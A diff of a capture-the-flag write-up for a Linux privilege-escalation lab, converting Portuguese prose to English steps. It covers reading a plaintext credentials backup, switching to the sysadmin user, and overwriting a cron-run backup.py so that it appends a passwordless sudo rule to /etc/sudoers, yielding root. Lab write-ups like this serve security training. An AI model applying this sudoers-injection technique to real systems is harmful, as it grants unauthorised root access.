@@ -1,20 +1,27 @@
 # Privesc Linux - 2
 
-O laboratório já nos fornece a credencial para acesso via SSH.
+## Initial Access
+
+The lab provides SSH credentials.
 
 ```bash
-user: ctfplayer
-password: ctfplayer2026
 ssh ctfplayer@<IP_MACHINE>
+# password: ctfplayer2026
 ```
 
-![SSH Access](images/img-000.png)
+## Enumeration
 
-Durante a enumeração dos diretórios, identificamos arquivos e diretórios ocultos, entre eles `.config`. Ao acessar esse diretório, encontramos o subdiretório `app`, no qual identificamos um arquivo oculto chamado `.credentials.bak`.
+```bash
+ls -la ~
+```
 
-![Enumeration](images/img-001.png)
+Hidden files and directories are present, including `.config`.
 
-Utilizando o comando `cat`, realizamos a leitura do conteúdo e identificamos a credencial `sysadmin`.
+```bash
+ls -la ~/.config/app/
+```
+
+Hidden file found: `.credentials.bak`
 
 ```bash
 cat ~/.config/app/.credentials.bak
@@ -27,20 +34,17 @@ cat ~/.config/app/.credentials.bak
 # TODO: migrar para vault
 ```
 
-Utilizando a credencial realizamos a movimentação lateral para o usuário `sysadmin`. Após obtermos acesso, listamos os arquivos e diretórios e identificamos o arquivo `user.txt`. Ao realizar a leitura de seu conteúdo, encontramos nossa primeira flag.
-
-![Lateral Movement](images/img-002.png)
+## Lateral Movement
 
 ```bash
 su sysadmin
+# password from .credentials.bak
 cd ~
+ls
 cat user.txt
-# hackingclub{l4t...}
 ```
 
-Verificando `notes.txt` do `sysadmin`, encontramos:
-
-![Notes](images/img-003.png)
+**User flag:** `hackingclub{l4t...}`
 
 ```bash
 cat notes.txt
@@ -56,43 +60,54 @@ TAREFAS:
 IMPORTANTE: O backup roda automaticamente. Não modificar sem avisar o time.
 ```
 
-Sabemos que existe um script de backup automático em `/opt/scripts` que:
+## Privilege Escalation
 
-- roda via `cron`
-- Logs em `/var/log/backup.log`
-
-Existem várias formas de explorar (obter Root), uma delas é adicionar `sysadmin` ao `sudoers`.
-
-Vamos alterar o conteúdo de `backup.py` para:
-
-```python
-import os
-os.system("echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
-```
-
-![Payload](images/img-004.png)
-
-Aguardar ~1 minuto e executar o comando `sudo su`
+Backup script location: `/opt/scripts/backup.py`  
+Executed via cron (approximately every 1 minute)  
+Logs: `/var/log/backup.log`
 
 ```bash
-sudo su
-whoami
-# root
+ls -la /opt/scripts/
+cat /var/log/backup.log
 ```
 
-![Root](images/img-005.png)
+**Exploitation:** Modify `backup.py` to add `sysadmin` to sudoers.
 
-Com o privilégio root navegamos e conseguimos obter nossa flag:
+```bash
+cp /opt/scripts/backup.py /tmp/backup.py.bak
+```
+
+```bash
+echo 'import os
+os.system("echo '\''sysadmin ALL=(ALL) NOPASSWD:ALL'\'' >> /etc/sudoers")' > /opt/scripts/backup.py
+```
+
+Wait ~1 minute for cron execution.
+
+```bash
+sudo -l
+sudo su
+whoami
+```
+
+```
+root
+```
+
+## Root Flag
 
 ```bash
 cat /root/root.txt
-# hackingclub{cr0t...}
 ```
 
----
+**Root flag:** `hackingclub{cr0t...}`
 
-## Arquivos complementares
+## Summary
 
-- [METHODOLOGY.md](METHODOLOGY.md) — passos detalhados e comandos
-- [LEARNINGS.md](LEARNINGS.md) — lições aprendidas
-- [CONCLUSION.md](CONCLUSION.md) — resumo e flags
+| Step | Action | Result |
+|------|--------|--------|
+| Initial Access | SSH as `ctfplayer` | Low privilege shell |
+| Enumeration | `~/.config/app/.credentials.bak` | `sysadmin` credentials |
+| Lateral Movement | `su sysadmin` | User flag |
+| Escalation | Overwrite `/opt/scripts/backup.py` | `sysadmin` in sudoers |
+| Root | `sudo su` | Root flag |
